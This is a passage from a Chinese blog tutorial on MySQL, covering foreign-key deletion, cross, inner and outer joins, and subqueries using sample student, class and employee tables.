<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> student;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> class;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建班级表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> class(</span><br><span class="line">    cid <span class="type">int</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">    cname <span class="type">varchar</span>(<span class="number">30</span>) </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建学生表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student(</span><br><span class="line">    sid <span class="type">int</span>(<span class="number">8</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">    sname <span class="type">varchar</span>(<span class="number">30</span>),</span><br><span class="line">    classid <span class="type">int</span>(<span class="number">8</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 为学生表添加外键约束</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> student <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> fk_student_classid <span class="keyword">FOREIGN</span> KEY(classid) <span class="keyword">REFERENCES</span> class(cid);</span><br><span class="line"><span class="comment">-- 向班级表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> class(cid,cname)<span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;Java&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> class(cid,cname)<span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;Python&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 向学生表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student(sid,sname,classid)<span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;tome&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student(sid,sname,classid)<span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;lucy&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student(sid,sname,classid)<span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">&#x27;lili&#x27;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student(sid,sname,classid)<span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">&#x27;domi&#x27;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="number">123456789101112131415161718192021222324252627</span>AI助手</span><br></pre></td></tr></table></figure>

<h3 id="1-关联查询"><a href="#1-关联查询" class="headerlink" title="1.关联查询"></a>1.关联查询</h3><p>查询Java班的所有学生 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> classid<span class="operator">=</span>(<span class="keyword">select</span> cid <span class="keyword">from</span> class <span class="keyword">where</span> cname<span class="operator">=</span><span class="string">&#x27;Java&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="2-关于关联关系的删除数据"><a href="#2-关于关联关系的删除数据" class="headerlink" title="2.关于关联关系的删除数据"></a>2.关于关联关系的删除数据</h3><p>请从班级表中删除Java班级。在此，请注意：班级表和学生表之间存在关联关系；要删除Java班级，应该先删除学生表中与该班相关联的学生。否则，假若先删除Java班那么学生表中的cid就失去了关联<br>删除Java班 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> student <span class="keyword">where</span> classid<span class="operator">=</span>(<span class="keyword">select</span> cid <span class="keyword">from</span> class <span class="keyword">where</span> cname<span class="operator">=</span><span class="string">&#x27;Java&#x27;</span>);</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> class <span class="keyword">where</span> cname<span class="operator">=</span><span class="string">&#x27;Java&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="十四、多表连接查询"><a href="#十四、多表连接查询" class="headerlink" title="十四、多表连接查询"></a>十四、多表连接查询</h2><h3 id="1-交叉连接查询"><a href="#1-交叉连接查询" class="headerlink" title="1.交叉连接查询"></a>1.交叉连接查询</h3><p>交叉连接返回的结果是被连接的两个表中所有数据行的笛卡儿积；比如：集合A&#x3D;{a,b}，集合B&#x3D;{0,1,2}，则集合A和B的笛卡尔积为{(a,0),(a,1),(a,2),(b,0),(b,1),(b,2)}。所以，交叉连接也被称为笛卡尔连接，其语法格式如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> 表<span class="number">1</span> <span class="keyword">CROSS</span> <span class="keyword">JOIN</span> 表<span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>在该语法中：CROSS JOIN用于连接两个要查询的表，通过该语句可以查询两个表中所有的数据组合。<br><strong>由于这个交叉连接查询在实际运用中没有任何意义，所以只做为了解即可</strong></p>
<h3 id="2-内连接查询"><a href="#2-内连接查询" class="headerlink" title="2.内连接查询"></a>2.内连接查询</h3><p>内连接(Inner Join)又称简单连接或自然连接，是一种非常常见的连接查询。内连接使用比较运算符对两个表中的数据进行比较并列出与连接条件匹配的数据行，组合成新的 记录。也就是说在内连接查询中只有满足条件的记录才能出现在查询结果中。其语法格式如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 查询字段<span class="number">1</span>,查询字段<span class="number">2</span>, ... <span class="keyword">FROM</span> 表<span class="number">1</span> [<span class="keyword">INNER</span>] <span class="keyword">JOIN</span> 表<span class="number">2</span> <span class="keyword">ON</span> 表<span class="number">1.</span>关系字段<span class="operator">=</span>表<span class="number">2.</span>关系字段</span><br></pre></td></tr></table></figure>

<p>在该语法中：INNER JOIN用于连接两个表，ON来指定连接条件；其中INNER可以省略。</p>
<p>准备数据，代码如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 若存在数据库mydb则删除</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE IF <span class="keyword">EXISTS</span> mydb;</span><br><span class="line"><span class="comment">-- 创建数据库mydb</span></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE mydb;</span><br><span class="line"><span class="comment">-- 选择数据库mydb</span></span><br><span class="line">USE mydb;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建部门表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> department(</span><br><span class="line">  did <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY</span> KEY, </span><br><span class="line">  dname <span class="type">varchar</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建员工表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> employee (</span><br><span class="line">  eid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY</span> KEY, </span><br><span class="line">  ename <span class="type">varchar</span> (<span class="number">20</span>), </span><br><span class="line">  eage <span class="type">int</span> (<span class="number">2</span>), </span><br><span class="line">  departmentid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 向部门表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> department <span class="keyword">VALUES</span>(<span class="number">1001</span>,<span class="string">&#x27;财务部&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> department <span class="keyword">VALUES</span>(<span class="number">1002</span>,<span class="string">&#x27;技术部&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> department <span class="keyword">VALUES</span>(<span class="number">1003</span>,<span class="string">&#x27;行政部&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> department <span class="keyword">VALUES</span>(<span class="number">1004</span>,<span class="string">&#x27;生活部&#x27;</span>);</span><br><span class="line"><span class="comment">-- 向员工表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;张三&#x27;</span>,<span class="number">19</span>,<span class="number">1003</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;李四&#x27;</span>,<span class="number">18</span>,<span class="number">1002</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">&#x27;王五&#x27;</span>,<span class="number">20</span>,<span class="number">1001</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee <span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">&#x27;赵六&#x27;</span>,<span class="number">20</span>,<span class="number">1004</span>);</span><br><span class="line"><span class="number">1234567891011121314151617181920212223242526272829303</span></span><br></pre></td></tr></table></figure>

<p>查询员工姓名及其所属部门名称 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> employee.ename,department.dname <span class="keyword">from</span> department <span class="keyword">inner</span> <span class="keyword">join</span> employee <span class="keyword">on</span> department.did<span class="operator">=</span>employee.departmentid;</span><br></pre></td></tr></table></figure>

<h3 id="3-外连接查询"><a href="#3-外连接查询" class="headerlink" title="3.外连接查询"></a>3.外连接查询</h3><p>在使用内连接查询时我们发现：返回的结果只包含符合查询条件和连接条件的数据。但是，有时还需要在返回查询结果中不仅包含符合条件的数据，而且还包括左表、右表或两个表中的所有数据，此时我们就需要使用外连接查询。外连接又分为左(外)连接和右(外)连接。其语法格式如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 查询字段<span class="number">1</span>,查询字段<span class="number">2</span>, ... <span class="keyword">FROM</span> 表<span class="number">1</span> <span class="keyword">LEFT</span> <span class="operator">|</span> <span class="keyword">RIGHT</span> [<span class="keyword">OUTER</span>] <span class="keyword">JOIN</span> 表<span class="number">2</span> <span class="keyword">ON</span> 表<span class="number">1.</span>关系字段<span class="operator">=</span>表<span class="number">2.</span>关系字段 <span class="keyword">WHERE</span> 条件</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>由此可见，外连接的语法格式和内连接非常相似，只不过使用的是LEFT [OUTER] JOIN、RIGHT [OUTER] JOIN关键字。其中，关键字左边的表被称为左表，关键字右边的表被称为右表；OUTER可以省略。<br>在使用左(外)连接和右(外)连接查询时，查询结果是不一致的，具体如下：<br><strong>1、LEFT [OUTER] JOIN 左(外)连接：返回包括左表中的所有记录和右表中符合连接条件的记录。<br>2、RIGHT [OUTER] JOIN 右(外)连接：返回包括右表中的所有记录和左表中符合连接条件的记录。</strong></p>
<p>先准备数据，代码如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 若存在数据库mydb则删除</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE IF <span class="keyword">EXISTS</span> mydb;</span><br><span class="line"><span class="comment">-- 创建数据库mydb</span></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE mydb;</span><br><span class="line"><span class="comment">-- 选择数据库mydb</span></span><br><span class="line">USE mydb;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建班级表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> class(</span><br><span class="line">  cid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY</span> KEY, </span><br><span class="line">  cname <span class="type">varchar</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建学生表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student (</span><br><span class="line">  sid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY</span> KEY, </span><br><span class="line">  sname <span class="type">varchar</span> (<span class="number">20</span>), </span><br><span class="line">  sage <span class="type">int</span> (<span class="number">2</span>), </span><br><span class="line">  classid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">-- 向班级表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> class <span class="keyword">VALUES</span>(<span class="number">1001</span>,<span class="string">&#x27;Java&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> class <span class="keyword">VALUES</span>(<span class="number">1002</span>,<span class="string">&#x27;C++&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> class <span class="keyword">VALUES</span>(<span class="number">1003</span>,<span class="string">&#x27;Python&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> class <span class="keyword">VALUES</span>(<span class="number">1004</span>,<span class="string">&#x27;PHP&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 向学生表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;张三&#x27;</span>,<span class="number">20</span>,<span class="number">1001</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;李四&#x27;</span>,<span class="number">21</span>,<span class="number">1002</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">&#x27;王五&#x27;</span>,<span class="number">24</span>,<span class="number">1002</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">&#x27;赵六&#x27;</span>,<span class="number">23</span>,<span class="number">1003</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">5</span>,<span class="string">&#x27;Jack&#x27;</span>,<span class="number">22</span>,<span class="number">1009</span>);</span><br><span class="line"><span class="number">1234567891011121314151617181920212223242526272829303132</span>AI助手</span><br></pre></td></tr></table></figure>

<p><em>准备这组数据有一定的特点，为的是让大家直观的看出左连接与右连接的不同之处<br>1、班级编号为1004的PHP班级没有学生<br>2、学号为5的学生Jack班级编号为1009，该班级编号并不在班级表中</em></p>
<h4 id="3-1-左（外）连接查询"><a href="#3-1-左（外）连接查询" class="headerlink" title="3.1 左（外）连接查询"></a>3.1 左（外）连接查询</h4><p>左(外)连接的结果包括LEFT JOIN子句中指定的左表的所有记录，以及所有满足连接条件的记录。如果左表的某条记录在右表中不存在则在右表中显示为空。<br>查询每个班的班级ID、班级名称及该班的所有学生的名字 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> class.cid,class.cname,student.sname <span class="keyword">from</span> class <span class="keyword">left</span> <span class="keyword">outer</span> <span class="keyword">join</span> student <span class="keyword">on</span> class.cid<span class="operator">=</span>student.classid;</span><br></pre></td></tr></table></figure>


<p>展示结果分析：<br>1、分别找出Java班、C++班、Python班的学生<br>2、右表的Jack不满足查询条件故其没有出现在查询结果中<br>3、虽然左表的PHP班没有学生，但是任然显示了PHP的信息；但是，它对应的学生名字为NULL</p>
<h4 id="3-2-右（外）连接查询"><a href="#3-2-右（外）连接查询" class="headerlink" title="3.2 右（外）连接查询"></a>3.2 右（外）连接查询</h4><p>右(外)连接的结果包括RIGHT JOIN子句中指定的右表的所有记录，以及所有满足连接条件的记录。如果右表的某条记录在左表中没有匹配，则左表将返回空值。<br>查询每个班的班级ID、班级名称及该班的所有学生的名字 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> class.cid,class.cname,student.sname <span class="keyword">from</span> class <span class="keyword">right</span> <span class="keyword">outer</span> <span class="keyword">join</span> student <span class="keyword">on</span> class.cid<span class="operator">=</span>student.classid;</span><br></pre></td></tr></table></figure>

<p>展示结果分析：<br>1、分别找出Java班、C++班、Python班的学生<br>2、左表的PHP班不满足查询条件故其没有出现在查询结果中<br>3、虽然右表的jack没有对应班级，但是任然显示王跃跃的信息；但是，它对应的班级以及班级编号均为NULL</p>
<h2 id="十五、子查询"><a href="#十五、子查询" class="headerlink" title="十五、子查询"></a>十五、子查询</h2><p>子查询是指一个查询语句嵌套在另一个查询语句内部的查询；该查询语句可以嵌套在一个 SELECT、SELECT…INTO、INSERT…INTO等语句中。在执行查询时，首先会执行子查询中的语句，再将返回的结果作为外层查询的过滤条件。在子査询中通常可以使用比较运算符和IN、EXISTS、ANY、ALL等关键字。</p>
<p>准备数据，代码如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> student;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> class;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建班级表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> class(</span><br><span class="line">  cid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY</span> KEY, </span><br><span class="line">  cname <span class="type">varchar</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建学生表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student (</span><br><span class="line">  sid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY</span> KEY, </span><br><span class="line">  sname <span class="type">varchar</span> (<span class="number">20</span>), </span><br><span class="line">  sage <span class="type">int</span> (<span class="number">2</span>), </span><br><span class="line">  classid <span class="type">int</span> (<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 向班级表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> class <span class="keyword">VALUES</span>(<span class="number">1001</span>,<span class="string">&#x27;Java&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> class <span class="keyword">VALUES</span>(<span class="number">1002</span>,<span class="string">&#x27;C++&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> class <span class="keyword">VALUES</span>(<span class="number">1003</span>,<span class="string">&#x27;Python&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> class <span class="keyword">VALUES</span>(<span class="number">1004</span>,<span class="string">&#x27;PHP&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> class <span class="keyword">VALUES</span>(<span class="number">1005</span>,<span class="string">&#x27;Android&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 向学生表插入数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">&#x27;张三&#x27;</span>,<span class="number">20</span>,<span class="number">1001</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">&#x27;李四&#x27;</span>,<span class="number">21</span>,<span class="number">1002</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">&#x27;王五&#x27;</span>,<span class="number">24</span>,<span class="number">1003</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">&#x27;赵六&#x27;</span>,<span class="number">23</span>,<span class="number">1004</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">5</span>,<span class="string">&#x27;小明&#x27;</span>,<span class="number">21</span>,<span class="number">1001</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">6</span>,<span class="string">&#x27;小红&#x27;</span>,<span class="number">26</span>,<span class="number">1001</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> student <span class="keyword">VALUES</span>(<span class="number">7</span>,<span class="string">&#x27;小亮&#x27;</span>,<span class="number">27</span>,<span class="number">1002</span>);</span><br><span class="line"><span class="number">1234567891011121314151617181920212223242526272829303132</span>AI助手</span><br></pre></td></tr></table></figure>

<h3 id="1-带比较运算符的子查询"><a href="#1-带比较运算符的子查询" class="headerlink" title="1.带比较运算符的子查询"></a>1.带比较运算符的子查询</h3><p>比较运算符前面我们提到过得，就是&gt;、&lt;、&#x3D;、&gt;&#x3D;、&lt;&#x3D;、!&#x3D;等<br>查询张三同学所在班级的信息 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> class <span class="keyword">where</span> cid<span class="operator">=</span>(<span class="keyword">select</span> classid <span class="keyword">from</span> student <span class="keyword">where</span> sname<span class="operator">=</span><span class="string">&#x27;张三&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>查询比张三同学所在班级编号还大的班级的信息 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> class <span class="keyword">where</span> cid<span class="operator">&gt;</span>(<span class="keyword">select</span> classid <span class="keyword">from</span> student <span class="keyword">where</span> sname<span class="operator">=</span><span class="string">&#x27;张三&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="2-带EXISTS关键字的子查询"><a href="#2-带EXISTS关键字的子查询" class="headerlink" title="2.带EXISTS关键字的子查询"></a>2.带EXISTS关键字的子查询</h3><p>EXISTS关键字后面的参数可以是任意一个子查询， 它不产生任何数据只返回TRUE或FALSE。当返回值为TRUE时外层查询才会 执行<br>假如王五同学在学生表中则从班级表查询所有班级信息 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> class <span class="keyword">where</span> <span class="keyword">exists</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> sname<span class="operator">=</span><span class="string">&#x27;王五&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="3-带ANY关键字的子查询"><a href="#3-带ANY关键字的子查询" class="headerlink" title="3.带ANY关键字的子查询"></a>3.带ANY关键字的子查询</h3><p>ANY关键字表示满足其中任意一个条件就返回一个结果作为外层查询条件。</p>
<p>查询比任一学生所属班级号还大的班级编号 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> class <span class="keyword">where</span> cid <span class="operator">&gt;</span> <span class="keyword">any</span> (<span class="keyword">select</span> classid <span class="keyword">from</span> student);</span><br></pre></td></tr></table></figure>

<h3 id="4-带ALL关键字的子查询"><a href="#4-带ALL关键字的子查询" class="headerlink" title="4.带ALL关键字的子查询"></a>4.带ALL关键字的子查询</h3><p>ALL关键字与ANY有点类似，只不过带ALL关键字的子査询返回的结果需同时满足所有内层査询条件。</p>
<p>查询比所有学生所属班级号还大的班级编号 MySQL命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> class <span class="keyword">where</span> cid <span class="operator">&gt;</span> <span class="keyword">all</span> (<span class="keyword">select</span> classid <span class="keyword">from</span> student);</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/26/linux%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="tyc的小窝">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/07/26/linux%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">Linux系统学习</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

